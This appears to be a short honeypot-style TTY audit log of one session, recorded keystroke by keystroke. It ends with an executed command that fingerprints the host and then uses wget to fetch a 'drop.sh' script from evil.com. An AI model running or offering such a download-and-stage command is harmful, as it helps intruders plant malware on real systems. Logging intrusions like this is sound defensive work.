=== CHAMELEON TTY AUDIT TRAIL [SESSION: 79ab38bc7614b65d] ===
Started at: 2026-10-08T20:16:05Z

[0000.000s] u
[0000.000s] n
[0000.000s] a
[0000.000s] m
[0000.000s] e
[0000.000s]  
[0000.000s] -
[0000.000s] a
[0000.000s] ;
[0000.000s]  
[0000.000s] c
[0000.000s] a
[0000.000s] t
[0000.000s]  
[0000.000s] /
[0000.000s] p
[0000.000s] r
[0000.000s] o
[0000.000s] c
[0000.000s] /
[0000.000s] c
[0000.000s] p
[0000.000s] u
[0000.000s] i
[0000.000s] n
[0000.000s] f
[0000.000s] o
[0000.000s] ;
[0000.000s]  
[0000.000s] w
[0000.000s] g
[0000.000s] e
[0000.000s] t
[0000.000s]  
[0000.000s] h
[0000.000s] t
[0000.000s] t
[0000.000s] p
[0000.000s] :
[0000.000s] /
[0000.000s] /
[0000.000s] e
[0000.000s] v
[0000.000s] i
[0000.000s] l
[0000.000s] .
[0000.000s] c
[0000.000s] o
[0000.000s] m
[0000.000s] /
[0000.000s] d
[0000.000s] r
[0000.000s] o
[0000.000s] p
[0000.000s] .
[0000.000s] s
[0000.000s] h
[0000.000s] <CR>
[0000.000s] >>> COMMAND EXECUTED: "uname -a; cat /proc/cpuinfo; wget http://evil.com/drop.sh"

=== SESSION TERMINATED AT 2026-10-08T20:16:10Z ===
